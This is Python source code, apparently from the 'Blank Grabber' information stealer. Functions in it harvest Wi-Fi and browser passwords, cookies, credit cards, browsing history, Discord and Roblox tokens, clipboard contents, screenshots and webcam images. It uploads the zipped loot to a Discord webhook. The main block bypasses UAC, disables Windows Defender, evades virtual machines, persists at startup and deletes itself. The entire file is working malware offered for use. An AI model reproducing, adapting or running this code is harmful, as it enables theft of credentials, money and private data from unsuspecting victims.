            with open(os.path.join(self.tempfolder, 'Error Logs.txt'), 'w') as file:
                file.write('\n===============================================================================\n'.join(utils.ERRORLOGS))
    
    def cleanUp(self) -> None:
        if os.path.isfile(self.archive):
            os.remove(self.archive)
        if os.path.isdir(self.tempfolder):
            shutil.rmtree(self.tempfolder)
    
    @utils.catch
    def captureWifiPasswords(self) -> None:
        passwords = utils.getWifiPasswords()
        profiles = list()
        for profile, psw in passwords.items():
            profiles.append(f'Network: {profile}\nPassword: {psw}')
        divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
        with open(os.path.join(self.system, 'Wifi Networks.txt'), "w", encoding= 'utf-8', errors= 'ignore') as file:
            file.write(divider.lstrip() + divider.join(profiles))
        self.collection['Wifi Passwords'] += len(profiles)
    
    @utils.catch
    def discordInjection(self) -> None:
        for dir in Discord.injectJS():
            if system.isInStartup():
                continue
            appname = os.path.basename(dir)
            killTask = subprocess.run('taskkill /F /IM {}.exe'.format(appname), shell= True, capture_output= True)
            if killTask.returncode == 0:
                for root, _, files in os.walk(dir):
                    for file in files:
                        if file.lower() == appname.lower() + '.exe':
                            time.sleep(3)
                            filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
                            UpdateEXE = os.path.join(dir, 'Update.exe')
                            DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                            subprocess.run([UpdateEXE, '--processStart', DiscordEXE], shell= True, capture_output= True)
    
    @utils.catch
    def blockSites(self) -> None:
        if BLOCK_SITES:
            try:
                system.blockSites()
            except Exception:
                return
        
    @utils.catch
    def captureBrowserPasswords(self) -> None:
        """ vault = Browsers.getChromePass()
        passwords = list()
        if not vault:
            return
        for i in vault:
            URL = i.get('URL')
            USERNAME = i.get('USERNAME')
            PASSWORD = i.get('PASSWORD')
            passwords.append('URL: {}\nUSERNAME: {}\nPASSWORD: {}'.format(URL, USERNAME, PASSWORD))
        os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
        divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
        with open(os.path.join(credentials, 'Chrome Passwords.txt'), 'w') as file:
            file.write(divider.lstrip() + divider.join(passwords))
        self.collection['Passwords'] += len(passwords) """
        if not os.path.isfile(PasswordGrabber := os.path.join(MEIPASS, 'getPass')):
            return
        system.unblockMOTW(PasswordGrabber)
        with open(PasswordGrabber, 'rb') as file:
            data = file.read()
        data = AESModeOfOperationCTR(b'f61QfygejoxUWGxI').decrypt(data)
        if not b'This program cannot be run in DOS mode.' in data:
            return
        if hasattr(sys, 'frozen'):
            tempGetPass = os.path.join(MEIPASS, 'getPass.exe')
        else:
            tempGetPass = os.path.join(os.getenv('temp'), 'getPass.exe')
        with open(tempGetPass, 'wb') as file:
            file.write(data)
        tempGetPassPath = os.path.dirname(tempGetPass)
        try:
            subprocess.run('getPass.exe /stext pass.txt', shell= True, capture_output= True, timeout= 5.0, cwd= tempGetPassPath)
        except subprocess.TimeoutExpired:
            os.remove(tempGetPass)
            return
        os.remove(tempGetPass)
        if os.path.isfile(tempGetPassCFG := os.path.join(tempGetPassPath, 'getPass.cfg')):
            os.remove(tempGetPassCFG)
        with open(passfile := os.path.join(tempGetPassPath, 'pass.txt'), encoding= 'utf-16', errors= 'ignore') as file:
            data = file.read()
        if 'URL' in data:
            divider = 'Blank Grabber'.center(50, '=')
            data = list(['\n'.join(x.replace('=' * 50, divider, 1).splitlines()[:-1]) for x in data.split('\n\n') if x != ''])
            self.collection['Passwords'] += len(data)
            os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
            with open(os.path.join(credentials, 'Passwords.txt'), 'w') as file:
                file.write('\n\n'.join(data))
        os.remove(passfile)
    
    @utils.catch
    def captureChromeCookies(self) -> None:
        vault = Browsers.getChromeCookies()
        cookies = list()
        if not vault:
            return
        for i in vault:
            HOST = i.get('HOST')
            NAME = i.get('NAME')
            PATH = i.get('PATH')
            COOKIE = i.get('COOKIE')
            EXPIRY = i.get('EXPIRY')
            cookies.append('{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(HOST, 'FALSE' if EXPIRY == 0 else 'TRUE', PATH, 'FALSE' if HOST.startswith('.') else 'TRUE', EXPIRY, NAME, COOKIE))
        os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
        divider = '\n'
        with open(os.path.join(credentials, 'Chrome Cookies.txt'), 'w') as file:
            file.write(divider.join(cookies))
        self.collection['Cookies'] += len(cookies)
        self.robloxStealer(cookies)
    
    @utils.catch
    def captureChromeCC(self) -> None:
        vault = Browsers.getChromeCC()
        cards = list()
        if not vault:
            return
        for i in vault:
            NAME, MONTH, YEAR, NUMBER = i.get('NAME'), i.get('MONTH'), i.get('YEAR'), i.get('NUMBER')
            cards.append('Name On Card: {}\nExpiration Month: {}\nExpiration Year: {}\nCard Number: {}'.format(NAME, MONTH, YEAR, NUMBER))
        divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
        os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
        with open(os.path.join(credentials, 'Chrome CC.txt'), 'w') as file:
            file.write(divider.lstrip() + divider.join(cards))
        self.collection['Credit Cards'] += len(cards)
    
    @utils.catch
    def captureChromeHistory(self) -> None:
        vault = Browsers.getChromeHistory()
        history = list()
        if not vault:
            return
        for i in vault:
            URL, TITLE, VC, _ = i
            history.append('Title: {}\nURL: {}\nVisit Count: {}'.format(TITLE, URL, VC))
        divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
        os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
        with open(os.path.join(credentials, 'Chrome History.txt'), 'w', encoding= 'utf-8') as file:
            file.write(divider.lstrip() + divider.join(history))
        self.collection['History'] += len(history)

    @utils.catch
    def minecraftStealer(self) -> None:
        if not os.path.exists(mcdir := os.path.join(self.roaming, ".minecraft")):
            return
        for i in os.listdir(mcdir):
            if not i.endswith((".json", ".txt", ".dat")):
                continue
            os.makedirs(grabpath := os.path.join(self.tempfolder, "Gaming", "Minecraft"), exist_ok= True)
            utils.copy(os.path.join(mcdir, i), os.path.join(grabpath, i))
        self.collection['Games'] += 1
    
    @utils.catch
    def robloxStealer(self, cookies= []) -> None:
        robloxcookies = list()
        def check(cookie):
            headers = {'Cookie' : '.ROBLOSECURITY=' + cookie}
            try:
                r = json.loads(self.http.request('GET', 'https://www.roblox.com/mobileapi/userinfo', headers= headers).data.decode())
            except json.JSONDecodeError:
                return
            data = f'Username: {r["UserName"]}\nUserID: {r["UserID"]}\nRobux: {r["RobuxBalance"]}\nBuilders Club Member: {r["IsAnyBuildersClubMember"]}\nPremium: {r["IsPremium"]}\nThumbnail: {r["ThumbnailUrl"]}\n\nCookie: {cookie}'
            robloxcookies.append(data)
        
        temp = ['\n'.join(cookies)]
        for i in ('HKCU', 'HKLM'):
            rbxcmd = subprocess.run(f'powershell Get-ItemPropertyValue -Path {i}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY', capture_output= True, shell= True)
            if not rbxcmd.returncode:
                temp.append(rbxcmd.stdout.decode(errors= 'backslashescape'))
        for i in temp:
            for j in re.findall(r'_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+', i):
                check(j)
        if robloxcookies:
            division = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
            os.makedirs(rbdir := os.path.join(self.tempfolder, 'Gaming', 'Roblox'), exist_ok= True)
            with open(os.path.join(rbdir, 'Roblox Cookies.txt'), 'w', encoding= 'utf-8', errors= 'ignore') as file:
                file.write((division).join(robloxcookies))
            self.collection['Roblox Cookies'] += len(robloxcookies)
    
    @utils.catch
    def getIPandSystemInfo(self) -> None:
        self.ipinfo = "(Unable to get IP info)"
        try:
            r = json.loads(self.http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
            if r.get("status") != "success":
                raise Exception("Failed")
            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
            if len(r["reverse"]) != 0:
                data += f"\nReverse DNS: {r['reverse']}"
        except Exception:
            r = json.loads(self.http.request("GET", "http://httpbin.org/get").data.decode())
            data = f"\nIP: {r.get('origin')}"
        self.ipinfo = data
    
    def misc(self):
        @utils.catch
        def directoryTree() -> None:
            output = {}
            for location in ['Desktop', 'Documents' , 'Downloads', 'Music', 'Pictures', 'Videos']:
                location = os.path.join(os.getenv('userprofile'), location)
                if not os.path.isdir(location):
                    continue
                dircontent = os.listdir(location)
                if 'desltop.ini' in dircontent:
                    dircontent.remove('desktop.ini')
                if dircontent:
                    output[os.path.split(location)[-1]] = utils.tree(location)
            for key, value in output.items():
                os.makedirs(os.path.join(self.tempfolder, 'Directories'), exist_ok= True)
                with open(os.path.join(self.tempfolder, 'Directories', f'{key}.txt'), 'w', encoding= 'utf-8') as file:
                    file.write(value)
        
        @utils.catch
        def clipboard() -> None:
            output = utils.getClipboard()
            if len(output) > 0:
                with open(os.path.join(self.system, 'Clipboard.txt'), 'w', encoding= 'utf-8', errors= 'ignore') as file:
                    file.write(output)
        
        @utils.catch
        def getAV() -> None:
            output = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', capture_output= True, shell= True)
            if not output.returncode:
                output = output.stdout.decode(errors= 'ignore').strip().replace('\r\n', '\n').splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    with open(os.path.join(self.system, 'Antivirus.txt'), 'w', encoding= 'utf-8', errors= 'ignore') as file:
                        file.write('\n'.join(output))

        @utils.catch
        def tasklist() -> None:
            output = subprocess.run('tasklist /FO LIST', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().replace('\r\n', '\n')
            with open(os.path.join(self.system, 'Task List.txt'), 'w', errors= 'ignore') as tasklist:
                tasklist.write(output)

        @utils.catch
        def sysInfo() -> None:
            output = subprocess.run('systeminfo', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().replace('\r\n', '\n')
            with open(os.path.join(self.system, 'System Info.txt'), 'w', errors= 'ignore') as file:
                file.write(output)

        threads = list()
        for func in (
            directoryTree, clipboard, getAV, tasklist, sysInfo
        ):
            t = Thread(target= func)
            threads.append(t)
            t.start()
        
        for thread in threads:
            thread.join()
    
    @utils.catch
    def getPCInfo(self) -> None:
        ComputerName = os.getenv("computername")
        ComputerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
        TotalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000)) + " GB"
        HWID = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
        CPU = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
        GPU = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()

        self.PCinfo = (ComputerName, ComputerOS, TotalMemory, HWID, CPU, GPU, productKey)
    
    @utils.catch
    def captureDiscordTokens(self) -> None:
        data = Discord.getTokens()
        if not data:
            return
        divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
        tokenData = list()
        for i in data:
            USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = i.values()
            tokenData.append("Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}".format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
        os.makedirs(discordfolder := os.path.join(self.tempfolder, 'Messenger', 'Discord'), exist_ok= True)
        with open(os.path.join(discordfolder, 'Discord Info.txt'), 'w', encoding= 'utf-8', errors= 'ignore') as file:
            file.write(divider.lstrip() + divider.join(tokenData))
        self.collection['Discord Info'] += len(tokenData)
    
    @utils.catch
    def screenshot(self) -> None:
        image = ImageGrab.grab(bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(os.path.join(self.system, "Screenshot.png"))
        self.collection['Screenshot'] += 1
    
    @utils.catch
    def webshot(self):
        if not CAPTURE_WEBCAM or not os.path.isfile(Camfile := os.path.join(MEIPASS, 'Camera')):
            return
        system.unblockMOTW(Camfile)
        def isMonochrome(path):
            return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)

        with open(Camfile, 'rb') as file:
            data = file.read()
        data = AESModeOfOperationCTR(b'f61QfygejoxUWGxI').decrypt(data)
        if not b'This program cannot be run in DOS mode.' in data:
            return
        if hasattr(sys, 'frozen'):
            tempCam = os.path.join(MEIPASS, 'Camera.exe')
        else:
            tempCam = os.path.join(os.getenv('temp'), 'Camera.exe')
        with open(tempCam, 'wb') as file:
            file.write(data)
        tempCamPath = os.path.dirname(tempCam)
        camlist = [x[15:] for x in subprocess.run('Camera.exe /devlist', capture_output= True, shell= True, cwd= tempCamPath).stdout.decode(errors= 'ignore').splitlines() if "Device name:" in x]
        for index, name in enumerate(camlist):
            try:
                subprocess.run('Camera.exe /devnum {} /quiet /filename image.bmp'.format(index + 1), shell= True, capture_output= True, cwd= tempCamPath, timeout= 5.0).stdout.decode(errors= 'ignore')
            except subprocess.TimeoutExpired:
                os.remove(tempCam)
                return
            if not os.path.isfile(tempimg := os.path.join(tempCamPath, 'image.bmp')):
                continue
            if isMonochrome(tempimg):
                os.remove(tempimg)
                continue
            os.makedirs(webcamfolder := os.path.join(self.tempfolder, 'Webcam'), exist_ok= True)
            with Image.open(tempimg) as img:
                img.save(os.path.join(webcamfolder, '{}.png'.format(name)), 'png')
            os.remove(tempimg)
            self.collection['Webcam'] += 1
        os.remove(tempCam)

    def zip(self) -> None:
        shutil.make_archive(self.archive.rsplit('.', 1)[0], 'zip', self.tempfolder)
    
    def send(self) -> None:
        self.zip()
        if not os.path.isfile(self.archive):
            return
        ComputerName, ComputerOS, TotalMemory, HWID, CPU, GPU, productKey = self.PCinfo
        grabbed_info = list()
        for name, value in self.collection.items():
            grabbed_info.append('{} : {}'.format(name, value))
        grabbed_info = '\n'.join(grabbed_info)
        payload = {
  'content': '@everyone' if PINGME else '',
  'embeds': [
    {
      'title': 'Blank Grabber',
      'description': f'**__System Info__\n```autohotkey\nComputer Name: {ComputerName}\nComputer OS: {ComputerOS}\nTotal Memory: {TotalMemory}\nHWID: {HWID}\nCPU: {CPU}\nGPU: {GPU}\nProduct Key: {productKey}```\n__IP Info__```prolog\n{self.ipinfo}```\n__Grabbed Info__```js\n{grabbed_info}```**',
      'url': 'https://github.com/Blank-c/Blank-Grabber',
      'color': 34303,
      'footer': {
        'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'
      },
      'thumbnail': {
        'url': 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
      }
    }
  ]
}       
        with open(self.archive, 'rb') as file:
            self.http.request("POST", WEBHOOK, body= json.dumps(payload).encode(), headers= Discord.getHeaders())
            self.http.request('POST', WEBHOOK, fields= {'file' : (self.archive, file.read())}, headers= Discord.getHeaders())

if __name__ == '__main__':
    if FROZEN := hasattr(sys, 'frozen'):
        Thread(target= system.unblockMOTW, args= (system.getSelf()[0], ), daemon= True).start()

    if not system.isAdmin():
        system.UACbypass()
    
    if not system.isInStartup() and os.path.isfile(os.path.join(MEIPASS, 'bound.exe')):
        utils.copy(os.path.join(MEIPASS, 'bound.exe'), boundfile := os.path.join(os.getenv('temp'), 'bound', '{}.exe'.format(utils.generate())))
        def __func():
            try:
                if len(sys.argv) < 2:
                    args = ''
                else:
                    args = ' '.join(sys.argv[1:])
                os.startfile(boundfile, 'open', args)
            except:
                pass
        Thread(target= __func, daemon= True).start()
        del __func
        
    Thread(target= system.disableWD, daemon= True).start()
    system.WDexclude(system.getSelf()[0])
    system.WDexclude(os.getenv('temp', MEIPASS))
    while not system.isConnected():
        time.sleep(900)
    if VMPROTECT:
        isVM = vmprotect.checkVM()
        if isVM:
            if BSOD and not system.isInStartup():
                for i in ('svchost.exe', 'winnit.exe'):
                    subprocess.run(f'taskkill /F /IM {i}', shell= True, capture_output= True)
            os._exit(1)
    
    if bool(MESSAGE_BOX) and not system.isInStartup():
        utils.messagebox(MESSAGE_BOX)
    
    if STARTUP and not system.isInStartup() and FROZEN:
        system.putInStartup()
        system.WDexclude(system.STARTUPDIR)
    
    if not system.isInStartup() and DELETE_ITSELF and FROZEN:
        subprocess.run(f'attrib +h +s "{system.getSelf()[0]}"', shell= True, capture_output= True)
    try:
        BlankGrabber()
        if DELETE_ITSELF and not system.isInStartup():
            system.deleteSelf()

    except Exception as e:
        with open(os.path.join(os.getenv('temp', 'syslogs.log')), 'w') as file:
            file.write(e)